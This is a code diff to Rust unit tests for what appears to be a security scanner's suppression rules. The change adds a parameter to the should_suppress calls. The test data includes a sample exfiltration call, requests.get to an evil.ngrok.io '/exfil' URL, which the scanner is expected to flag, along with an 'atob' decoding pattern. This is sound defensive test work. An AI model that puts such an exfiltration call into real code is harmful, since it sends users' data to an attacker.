@@ -166,8 +166,14 @@ mod tests {
             path_contains: vec!["node_modules/".to_string()],
             ..Default::default()
         };
-        assert!(s.should_suppress("node_modules/lodash/index.js", "index.js", "atob(x)", ""));
-        assert!(!s.should_suppress("src/utils.js", "utils.js", "atob(x)", ""));
+        assert!(s.should_suppress(
+            "node_modules/lodash/index.js",
+            "index.js",
+            "atob(x)",
+            "atob(x)",
+            ""
+        ));
+        assert!(!s.should_suppress("src/utils.js", "utils.js", "atob(x)", "atob(x)", ""));
     }
 
     #[test]
@@ -181,11 +187,13 @@ mod tests {
             "src/client.py",
             "client.py",
             r#"requests.get("https://api.openai.com/v1/chat")"#,
+            r#"requests.get("https://api.openai.com/v1/chat")"#,
             ""
         ));
         assert!(!s.should_suppress(
             "src/client.py",
             "client.py",
+            r#"requests.get("https://evil.ngrok.io/exfil")"#,
             r#"requests.get("https://evil.ngrok.io/exfil")"#,
             ""
         ));
